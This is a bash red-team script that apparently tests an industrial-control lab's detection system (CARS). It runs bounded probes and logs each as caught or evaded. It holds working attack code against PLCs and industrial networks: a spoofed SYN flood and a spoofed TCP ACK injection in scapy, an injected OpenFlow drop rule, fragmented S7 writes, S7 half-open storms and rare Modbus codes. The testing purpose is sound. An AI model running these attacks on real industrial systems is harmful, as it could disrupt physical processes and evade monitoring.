#!/usr/bin/env bash
# night_gaphunt.sh — adversarial red-team pass at CARS's documented residuals.
# Each probe is a genuine attempt; result logged caught/evaded with evidence.
# The two risky probes (state-exhaustion, half-open pool) are tightly bounded and
# abort if the live process degrades. (Script 7.)
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; source "$HERE/night_lib.sh"
CSV="$NIGHT_ROOT/logs/gaphunt.csv"; [ -f "$CSV" ] || echo "ts,gap,attempt,outcome,detail" > "$CSV"
rec(){ echo "$(TS),$1,$2,$3,$4" >> "$CSV"; log "  GAP[$1] $2 -> $3 ($4)"; }
online(){ python3 -c "import json;print(json.load(open('/tmp/cars_remediation_status.json')).get('online'))" 2>/dev/null; }
abort_if_process_down(){ [ "$(online)" = "1" ] || { rec "$1" "$2" ABORTED "process offline, backing off"; clean_all_reactive; selfheal; arm; sleep 5; return 1; }; return 0; }

log "gap-hunt pass begins"

# G-A fragmentation evasion (should now be CAUGHT after reassembly hardening)
if [ -f /home/msclab/frag_s7_write.py ]; then
  for split in 14 9; do
    before=$(ca_count)
    sudo ip netns exec "$NS_OP" python3 /home/msclab/frag_s7_write.py --host "$PLC1" --split "$split" >/dev/null 2>&1
    sleep 3; caught=$([ "$(ca_count)" -gt "$before" ] && echo CAUGHT || echo EVADED)
    rec fragmentation "split@byte$split" "$caught" "reassembly+PDU-anchored rules"; clean_src "$IP_OP"; sleep 4
  done
else rec fragmentation "frag_s7_write.py absent" SKIPPED "add the client to re-test"; fi

# G-B sub-poll transient flow injection (poll misses, event-monitor should catch)
COOKIE=0x0bad
for t in 1 2 3; do
  sudo ovs-ofctl -O OpenFlow13 add-flow ovs1 "cookie=$COOKIE,table=1,priority=99,tcp,nw_src=192.168.2.88,nw_dst=$PLC1,tp_dst=502,actions=drop"
  sleep 2; sudo ovs-ofctl -O OpenFlow13 del-flows ovs1 "cookie=$COOKIE/-1"
  # detection is scored from the event-monitor log if it is running
  det=$(tail -5 /tmp/cars_flowmon.csv 2>/dev/null | grep -c DRIFT)
  rec transient_injection "2s inject/delete #$t" "$([ "$det" -gt 0 ] && echo CAUGHT_eventdriven || echo missed_by_poll)" "10s poll vs event monitor"; sleep 4
done

# G-C TCP sequence injection into an established flow (UNTESTED case in the report)
abort_if_process_down seq_injection probe && {
  sudo ip netns exec "$NS_ATK" python3 - "$HMI1" "$PLC1" <<'PY' 2>/dev/null
try:
    from scapy.all import IP,TCP,send,conf; conf.verb=0
    import sys; s,d=sys.argv[1],sys.argv[2]
    # spoof an established HMI->PLC 5-tuple with an out-of-window ACK
    send(IP(src=s,dst=d)/TCP(sport=2000,dport=102,flags="A",seq=1,ack=1),verbose=0)
    print("sent")
except Exception as e: print("err",e)
PY
  # if GUARD/conntrack refuse it, no drift and no PLC delivery; record for manual pcap confirmation
  rec seq_injection "spoofed out-of-window ACK (HMI->PLC)" "SENT_for_manual_pcap_check" "GUARD binds HMI to port+MAC; confirm ct_state=+inv on the mirror"
  clean_src "$IP_ATK"; sleep 3; }

# G-D bounded connection-tracking (state) exhaustion
abort_if_process_down state_exhaustion probe && {
  ctb=$(sudo conntrack -C 2>/dev/null || echo NA)
  sudo ip netns exec "$NS_ATK" timeout 10 python3 - "$PLC1" <<'PY' 2>/dev/null
try:
    from scapy.all import IP,TCP,send,conf; conf.verb=0
    import sys,random,time,itertools; d=sys.argv[1]; end=time.time()+8
    while time.time()<end:
        send(IP(src="192.168.9.%d"%random.randint(1,254),dst=d)/TCP(sport=random.randint(1024,65535),dport=502,flags="S"),verbose=0)
except Exception as e: print("err",e)
PY
  cta=$(sudo conntrack -C 2>/dev/null || echo NA)
  legit=$([ "$(online)" = "1" ] && echo PROCESS_OK || echo PROCESS_DEGRADED)
  rec state_exhaustion "8s spoofed-source SYN flood" "$legit" "conntrack before=$ctb after=$cta"
  clean_all_reactive; selfheal; tank_frozen && { rec state_exhaustion "tank froze" FACTORYIO_EVICTED "transport-layer residual - recovering"; recover_process; }; sleep 4; }

# G-E half-open pool pressure on the S7-1200 (bounded; abort on degrade)
abort_if_process_down half_open probe && {
  for k in 1 2 3; do
    sudo ip netns exec "$NS_ATK" timeout 3 python3 "$S7" --host "$PLC1" --storm --secs 1 --hz 5 >/dev/null 2>&1
    clean_src "$IP_ATK"; sleep 2
    abort_if_process_down half_open "burst $k" || break
  done
  # online() stays 1 even when Factory IO is evicted, so check tank liveness explicitly
  froz=$(tank_frozen && echo FACTORYIO_EVICTED || echo PLC_POOL_OK)
  rec half_open "3 isolate-mid-session bursts" "$froz" "half-open on S7 accept queue until PLC TCP timeout"
  [ "$froz" = FACTORYIO_EVICTED ] && recover_process; }

# G-F rarest Modbus / MEI codes (intermittent recovery is a known sensor limit)
for fc in 0x11 0x2b 0x08; do
  before=$(ca_count)
  sudo ip netns exec "$NS_ATK" python3 "$MBATK" --host "$MODBUS" --fc "$fc" --count 3 >/dev/null 2>&1
  sleep 3; rec rare_modbus "FC $fc x3" "$([ "$(ca_count)" -gt "$before" ] && echo RECOGNISED || echo not_recovered)" "single-frame DPI limit"; clean_src "$IP_ATK"; sleep 4
done

clean_all_reactive; selfheal; greencheck || arm
log "gap-hunt pass done"
